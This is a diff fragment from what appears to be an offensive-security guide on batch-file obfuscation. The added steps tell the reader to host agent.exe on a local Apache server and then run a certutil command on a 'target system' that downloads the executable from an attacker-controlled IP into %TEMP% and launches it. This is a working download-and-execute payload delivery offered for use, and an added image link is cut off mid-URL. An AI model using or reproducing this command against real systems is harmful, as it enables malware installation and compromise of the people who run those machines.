@@ -185,7 +185,16 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 <br />
 
-`cmd.exe /c certutil -urlcache -split -f http://192.168.1.69/agent.exe %TEMP%\\agent.exe && start %TEMP%\\agent.exe`
+      1º - store your agent.exe into your local apache webroot (linux)
+      cp agent.exe /var/www/html/agent.exe
+
+      2º - start apache2 webserver (linux)
+      service apache2 start
+
+      3º - Add the follow lines to your script.bat and execute it on target system
+      cmd.exe /c certutil -urlcache -split -f http://192.168.1.69/agent.exe %TEMP%\\agent.exe && start %TEMP%\\agent.exe
+
+![batch obfuscation](http://i.)
 
 ---
 
